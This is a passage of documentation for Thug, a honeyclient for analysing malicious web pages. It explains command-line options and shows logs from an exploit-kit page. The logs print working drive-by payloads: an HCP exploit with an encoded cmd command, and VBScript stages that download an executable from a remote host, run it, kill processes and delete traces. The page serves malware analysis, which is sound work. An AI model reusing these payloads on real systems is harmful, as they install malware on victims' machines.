6,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101<span class="o">)))</span><span class="p">;&amp;</span>lt<span class="p">;</span>/script<span class="p">&amp;</span>gt<span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/iframe&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -&gt; hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>It’s quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served in this case.</p>
</section>
<section id="dom-events-handling">
<h2>DOM Events Handling<a class="headerlink" href="#dom-events-handling" title="Link to this heading"></a></h2>
<p>A useful option is the -e (–events) option which allows you to specify which DOM events should
be handled by Thug. By default <cite>load</cite> and <cite>mousemove</cite> events are always handled but you can add
other ones with this option. Using this option is quite simple. All you need to do is to specify
a comma-separated list of events to handle as shown below.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-e<span class="w"> </span>click,mouseover<span class="w"> </span>URL
</pre></div>
</div>
<p>In this example, the DOM events <cite>load</cite>, <cite>mousemove</cite>, <cite>click</cite> and <cite>mouseover</cite> will be handled by
Thug while all the other ones will be ignored.</p>
</section>
<section id="adobe-acrobat-reader">
<h2>Adobe Acrobat Reader<a class="headerlink" href="#adobe-acrobat-reader" title="Link to this heading"></a></h2>
<p>Taking a look at the available options you can see the -A (–adobepdf) option which is quite
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific
vulnerabilities basing on the Adobe Acrobat Reader version. Let’s take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 9.1.0 (which is
the default one).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-A<span class="w"> </span><span class="m">8</span>.1.0<span class="w"> </span><span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:00<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:00<span class="o">]</span><span class="w"> </span>&lt;applet<span class="w"> </span><span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span><span class="w"> </span><span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:00<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>Ryp.jar<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:03<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:03<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>applet<span class="w"> </span>Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>adodb.stream
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shell.application
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:04<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:07<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>File:<span class="w"> </span>d328b5a123bce1c0d20d763ad745303a
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>send
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>open
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Write
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>SaveToFile<span class="w"> </span><span class="o">(</span>.//..//3c9f737.exe<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Close
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Shell.Application<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>ShellExecute<span class="w"> </span>command:<span class="w"> </span>.//..//3c9f737.exe
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:08<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>./data/ap2.php<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:14<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Internet<span class="w"> </span>Explorer<span class="w"> </span>HCP<span class="w"> </span>Scheme<span class="w"> </span>Detected
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Help<span class="w"> </span>Center<span class="w"> </span>Malformed<span class="w"> </span>Escape<span class="w"> </span>Sequences<span class="w"> </span>Incorrect<span class="w"> </span>Handling
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span><span class="o">[</span>AST<span class="o">]</span>:<span class="w"> </span>Eval<span class="w"> </span>argument<span class="w"> </span>length<span class="w"> </span>&gt;<span class="w"> </span><span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="o">]</span><span class="w"> </span>Command:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Code:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:15<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:16<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:16<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>file<span class="w"> </span>d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:16<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">2</span><span class="o">]</span><span class="w"> </span>Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set<span class="w"> </span><span class="nv">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b<span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span>:Set<span class="w"> </span><span class="nv">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set<span class="w"> </span><span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On<span class="w"> </span>Error<span class="w"> </span>resume<span class="w"> </span>next
c.open<span class="w"> </span>OT,<span class="w"> </span>a,<span class="w"> </span>z:c.send<span class="o">()</span>
If<span class="w"> </span>c.Status<span class="w"> </span><span class="o">=</span><span class="w"> </span>x<span class="w"> </span>Then
d.Open:d.Type<span class="w"> </span><span class="o">=</span><span class="w"> </span>y:d.Write<span class="w"> </span>c.ResponseBody:d.SaveToFile<span class="w"> </span>b:d.Close
End<span class="w"> </span>If
Set<span class="w"> </span><span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>,<span class="w"> </span>Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM wm&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;player.e&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;xe&quot;</span>:W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;e&quot;</span>:Set<span class="w"> </span><span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:18:22] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
